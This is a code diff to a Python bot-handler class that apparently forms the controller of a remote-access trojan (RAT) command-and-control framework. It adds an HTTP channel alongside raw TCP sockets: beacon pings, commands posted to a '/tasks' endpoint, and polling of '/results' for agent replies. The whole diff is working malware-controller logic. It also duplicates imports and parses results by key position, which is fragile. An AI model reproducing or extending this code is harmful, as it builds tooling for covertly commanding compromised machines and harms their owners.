@@ -9,6 +9,8 @@ import queue
 import time
 import random
 import base64
+import json
+import requests
 
 import json
 import requests
@@ -144,6 +146,9 @@ class Handler(threading.Thread):
 
     def getReply(self, probe):
         return self.reply_values[probe]
+        
+    def getTT(self):
+        return self.transport_type
 
 #------------------------------------------------------------------------------------------------------------------------------
 
@@ -213,16 +218,17 @@ class Handler(threading.Thread):
                         self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : ERROR')
 
                 elif(self.transport_type == "HTTP"):
-                    request_payload_string = f'[{{"task_type":"ping","agent_id":{self.agent_id}}}]'
+                    request_payload_string = f'[{{"task_type":"ping","agent_id":"{str(self.agent_id)}"}}]'
                     request_payload = json.loads(request_payload_string)
                     task_obj = self.api_post_request("/tasks", request_payload)
-                    task_id = task_obj["task_id"]
+                    task_id = task_obj[0]["task_id"]
                     wfc = True # waiting for connection
                     t_end = time.time() + 10
                     while(time.time() < t_end and wfc):
                         results = self.api_get_request("/results")
                         for i in range(len(results)):
-                            if(results[i]["agent_id"] == self.agent_id and results[i]["task_id"] == task_id and results[i]["success"] == "true"):
+                            res_task_id = [key for key in results[i].keys()][2]
+                            if(results[i]["agent_id"] == self.agent_id) and res_task_id == task_id and results[i][res_task_id]["success"] == "true":
                                 wfc = False
                                 self.status[0] = "UP"
                             else:
@@ -376,8 +382,11 @@ class Handler(threading.Thread):
         # Single instance execution
         try:
             # Send data/command to RAT
-            
-            self.client.send(cmd_sent.encode('utf-8'))
+            if self.transport_type == "TCP":
+                self.client.send(cmd_sent.encode('utf-8'))
+            elif self.transport_type == "HTTP":
+                request_payload = json.loads(cmd_sent)
+                task_obj = self.api_post_request("/tasks", request_payload)
         except Exception as ex:
             # Log this - print to screen if not a beacon
             if cmd_sent != self.beacon_probe:
@@ -390,11 +399,31 @@ class Handler(threading.Thread):
             return "Error"
         else:
             cmd_response = ""
+            ex = False # Only true when http server has received exit response from agent
             while(True):
                 try:
-                    self.client.settimeout(3)
-                    recv = self.client.recv(4096).decode('utf-8')
-
+                    if self.transport_type == "TCP":
+                        self.client.settimeout(3)
+                        recv = self.client.recv(4096).decode('utf-8')
+                    elif self.transport_type == "HTTP":
+                        recv = ""
+                        request_payload = json.loads(cmd_sent)
+                        task_obj = self.api_post_request("/tasks", request_payload)
+                        task_id = task_obj[0]["task_id"]
+                        wfc = True # waiting for connection
+                        t_end = time.time() + 20
+                        while(time.time() < t_end and wfc):
+                            results = self.api_get_request("/results")
+                            for i in reversed(range(len(results))):
+                                res_task_id = [key for key in results[i].keys()][-1]
+                                if(not(res_task_id == "agent_id")):
+                                    print(f'received task_id: {res_task_id}')
+                                    print(f'received success token: {results[i][res_task_id]["success"]}')
+                                if(results[i]["agent_id"] == self.agent_id) and res_task_id == task_id and results[i][res_task_id]["success"] == "true":
+                                    wfc = False
+                                    recv = json.dumps(results[i])
+                                    break
+                        ex = True
                 except socket.timeout:
                     # if timeout exception is triggered - assume no more data
                     recv = ""
@@ -408,7 +437,7 @@ class Handler(threading.Thread):
 
                     break
 
-                if not recv:
+                if not recv or ex:
                     break
                 else:
                     cmd_response += recv
